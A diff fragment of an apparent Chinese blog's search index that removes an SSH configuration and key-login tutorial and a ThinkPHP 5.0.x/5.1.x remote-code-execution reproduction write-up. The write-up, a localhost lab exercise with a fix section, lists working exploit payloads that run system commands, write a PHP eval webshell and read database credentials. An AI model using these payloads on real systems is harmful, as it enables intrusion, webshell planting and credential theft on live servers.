-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host *			#  有效的主机（多个主机可用空格隔， “*” 表示所有）</span><br><span class="line">ForwardAgent no	#  连接是否经过代理验证（如果是）转发给远程计算机</span><br><span class="line">ForwardX11 no	#  连接受否被自动重定向到安全的通道和显示集</span><br><span class="line">RhostsRSAAuthentication no	#  不使用 RSA 算法基于 rhosts 的安全验证（仅 Version 1 版本使用）</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">PasswordAuthentication yes	#  使用口令验证</span><br><span class="line">HostbasedAuthentication no	#  与 RhostsRSAAuthentication 类似（Version2 使用）。</span><br><span class="line">GSSAPIAuthentication no		#  是否允许使用基于 GSSAPI 的用户认证（默认值为 ”yes”，仅用于 Version2）</span><br><span class="line">BatchMode no			#  如为 “yes“，passphrase&#x2F;password（交互式输入口令）的提示将被禁止</span><br><span class="line">CheckHostIP yes			#  设置 SSH 是否检查看连接到服务器的主机的 IP 地址以防止 DNS 欺骗（建议设置为 “yes“）</span><br><span class="line">AddressFamily any		#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ConnectTimeout 0		#  设置连接超时时间</span><br><span class="line">StrictHostKeyChecking ask       #  如果设置为 ”yes“，则不会自动把计算机的密钥加入 ”HOME&#x2F;.ssh&#x2F;known_hosts&quot; 文件，并且以一旦计算机的密钥发生了变化，就拒绝连接</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;identity	#  设置从哪个文件读取用户的 RSA 安全验证标识</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ecdsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ed25519</span><br><span class="line">Port 22			#  设置端口号</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">Cipher 3des		#  设置加密用的密码</span><br><span class="line">Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc	#  指定 Version2 使用的加密算法（多个算法之间使用逗号分隔）</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160	#  制定允许在 Version2 中使用哪些消息摘要算法来进行数据校验</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="三、sshd-config"><a href="#三、sshd-config" class="headerlink" title="三、sshd_config"></a>三、sshd_config</h2><p><code>sshd_config</code> 配置文件常用参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  常用</span><br><span class="line">Port 22			#  端口号</span><br><span class="line">AddressFamily any	#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ListenAddress 0.0.0.0	#  监听地址（0.0.0.0 表示所有地址）</span><br><span class="line">ListenAddress ::		#  监听地址（IPv6 地址）</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">LogLevel INFO		#  日志等级（QUIET, FATAL, ERROR, INFO, VERBOSE, DEBUG, DEBUG1, DEBUG2, and DEBUG3）</span><br><span class="line">UserDNS no		#  禁止DNS反向解析</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">PermitRootLogin no		#  禁止root用户登录</span><br><span class="line">PermitEmptyPasswords no 	#  禁止空密码用户登录</span><br><span class="line">LoginGraceTime 2m	#  登录验证时间为2分钟</span><br><span class="line">MaxAuthTries 6		#  最大重试次数6次</span><br><span class="line">AllowUsers steven	#  只允许 steven 用户登录</span><br><span class="line">DenyUsers steven	#  不允许登录用户 steven</span><br><span class="line"></span><br><span class="line">#  验证</span><br><span class="line">PasswordAuthentication yes	#  启用密码验证（如配置密钥登录，则需关闭此项）</span><br><span class="line">PubkeyAuthentication yes		#  启用密匙验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys		#  指定公钥数据库文件（用于密钥登陆）</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh 是 openssh 套件中的客户端连接工具</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-A	#  开启认证代理连接转发功能</span><br><span class="line">-a	#  关闭认证代理连接转发功能</span><br><span class="line">-b	#  使用本机指定地址作为对应连接的源 IP 地址</span><br><span class="line">-C	#  请求压缩所有数据</span><br><span class="line">-F	#  指定 ssh 指令的配置文件</span><br><span class="line">-f	#  后台执行 ssh 指令</span><br><span class="line">-g	#  允许远程主机连接主机</span><br><span class="line">-i	#  指定身份文件</span><br><span class="line">-l	#  指定连接远程服务器登陆用户名</span><br><span class="line">-N	#  不执行远程指令</span><br><span class="line">-o	#  指定配置选项</span><br><span class="line">-p	#  指定远程服务器的端口</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-X	#  开启 X11 转发功能</span><br><span class="line">-x	#  关闭 X11 转发功能</span><br><span class="line">-y	#  开启信任 X11 转发功能</span><br></pre></td></tr></table></figure>
-<h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><p>ssh-keygen 命令用于为 ssh 生成、管理和转换认证密钥</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh-keygene 常用参数</span><br><span class="line">-C	#  添加注释</span><br><span class="line">-b	#  指定密钥长度</span><br><span class="line">-e	#  读取openssh 的私钥或公钥文件</span><br><span class="line">-f	#  指定用来保存密钥的文件名</span><br><span class="line">-i	#  读取未加密的 ssh-v2 兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示 openssh 见阿荣的私钥&#x2F;公钥</span><br><span class="line">-l	#  显示公钥文件的指纹数据</span><br><span class="line">-N	#  提供一个新密码</span><br><span class="line">-P	#  提供一个旧密码</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-t	#  指定要创建的密钥类型（RSA、DSA，默认为 RSA）</span><br></pre></td></tr></table></figure>
-<h3 id="ssh-cocpy-id"><a href="#ssh-cocpy-id" class="headerlink" title="ssh-cocpy-id"></a>ssh-cocpy-id</h3><p>ssh-copy-id 命令用于把本地主机的公钥复制到远程主机的 /root/.ssh/authorized_keys 文件中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-cocpy-id 常用参数</span><br><span class="line">-i	#  指定公钥文件</span><br></pre></td></tr></table></figure>
-<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>加密的方式在本地的主机和远程主机之间复制文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  scp 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-B	#  以批处理模式运行</span><br><span class="line">-C	#  使用压缩</span><br><span class="line">-F	#  指定 ssh 配置文件</span><br><span class="line">-i	#  identity_file 从指定文件中读取传输时使用的密钥文件</span><br><span class="line">-l	#  指定宽带限制</span><br><span class="line">-o	#  指定使用的 ssh 选项</span><br><span class="line">-P	#  指定远程主机的端口号</span><br><span class="line">-p	#  保留文件的最后修改时间，最后访问时间和权限模式</span><br><span class="line">-q	#  不显示复制进度</span><br><span class="line">-r	#  以递归方式复制</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="五、配置密钥登陆"><a href="#五、配置密钥登陆" class="headerlink" title="五、配置密钥登陆"></a>五、配置密钥登陆</h2><h3 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改服务端配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PasswordAuthentication no	#  关闭密码验证</span><br><span class="line">PubkeyAuthentication yes	#  启用密钥验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br></pre></td></tr></table></figure>
-<h3 id="2、在客户端生成密钥"><a href="#2、在客户端生成密钥" class="headerlink" title="2、在客户端生成密钥"></a>2、在客户端生成密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">    指定私钥保存的路径及文件名（如不指定则默认为 &#x2F;root&#x2F;.ssh&#x2F;id_rsa）</span><br><span class="line">    密钥密码，最少五个字符（用于密钥连接时候使用，如不输入则可免密登陆）</span><br><span class="line">    确认密码</span><br><span class="line">    确完后自动在密钥文件所在位置创建 .pub 的公钥文件</span><br><span class="line"></span><br><span class="line">#  文件简介</span><br><span class="line">id_rsa		#  私钥文件</span><br><span class="line">id_rsa.pub	#  公钥文件</span><br><span class="line">authorized_keys	#  服务端公钥文件</span><br><span class="line">known_hosts	#  确认过公钥指纹的可信服务器列表的文件</span><br><span class="line">config		#  指定不同域名使用哪个密钥的配置文件</span><br></pre></td></tr></table></figure>
-<h3 id="3、上传公钥到服务端"><a href="#3、上传公钥到服务端" class="headerlink" title="3、上传公钥到服务端"></a>3、上传公钥到服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i id_rsa.pub root@192.168.1.123	#  将公钥上传到服务器（会自动在服务器 &#x2F;root&#x2F;.ssh&#x2F; 目录下创建 authorized_keys 文件）</span><br><span class="line"></span><br><span class="line">#  如前一行报错则可用 scp 命令拷贝</span><br><span class="line">#  将 .11 主机上的 id_rsa.pub 拷贝到指定目录并更名为 authorized_keys（服务端输入）</span><br><span class="line">scp -P 2222 root@10.1.82.11:&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">#  或</span><br><span class="line">#  将本地主机上的 id_rsa.pub 文件拷贝到 .11 主机上并更名为 authorized_keys（客户端输入）</span><br><span class="line">scp -P 2222 &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@10.1.82.12:&#x2F;root&#x2F;.ssh&#x2F;authorized_keys </span><br></pre></td></tr></table></figure>
-<h3 id="4、连接"><a href="#4、连接" class="headerlink" title="4、连接"></a>4、连接</h3><p>如设置了公钥密码则需输入公钥密码，如没设置公钥密码则可免密登陆</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 root@192.168.1.123</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1426,35 +1456,6 @@
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP 5.0.2 - 5.0.23 RCE 漏洞复现</title>
-    <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/</url>
-    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p>
-<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p>
-<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/1.jpg"></p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p>
-<p>2、构建 POC 并发包<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/2.png"></p>
-<p>3、使用蚁剑连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/3.png"></p>
-<p>POC：<br>通过发包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Linux）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot; &gt; 1.php</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Windows）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo ^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure>
-<p>通过 URL</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  查看数据库用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.username</span><br><span class="line"></span><br><span class="line">#  查看数据库密码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.password</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  phpinfo</span><br><span class="line">index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
-<h3 id="其他版本-POC"><a href="#其他版本-POC" class="headerlink" title="其他版本 POC"></a>其他版本 POC</h3><h4 id="当-PHP7-以上无法使用-Assert-的时候用"><a href="#当-PHP7-以上无法使用-Assert-的时候用" class="headerlink" title="当 PHP7 以上无法使用 Assert 的时候用"></a>当 PHP7 以上无法使用 Assert 的时候用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;包含&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
-<h5 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\View&#x2F;display&amp;content&#x3D;%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data&#x3D;1</span><br></pre></td></tr></table></figure>
-<h5 id="ThinkPHP-5-0-21"><a href="#ThinkPHP-5-0-21" class="headerlink" title="ThinkPHP 5.0.21"></a>ThinkPHP 5.0.21</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
-<h5 id="ThinkPhP-5-1"><a href="#ThinkPhP-5-1" class="headerlink" title="ThinkPhP 5.1.*"></a>ThinkPhP 5.1.*</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;system&amp;data&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br></pre></td></tr></table></figure>
-<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到5.0.24及以上，不开启debug模式</p>
-<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a><br><a href="https://blog.csdn.net/qq_29647709/article/details/84956221">https://blog.csdn.net/qq_29647709/article/details/84956221</a><br><a href="https://www.freebuf.com/vuls/194127.html">https://www.freebuf.com/vuls/194127.html</a></p>
-]]></content>
-      <categories>
-        <category>ThinkPHP 漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>ThinkPHP 漏洞复现</tag>
       </tags>
   </entry>
   <entry>
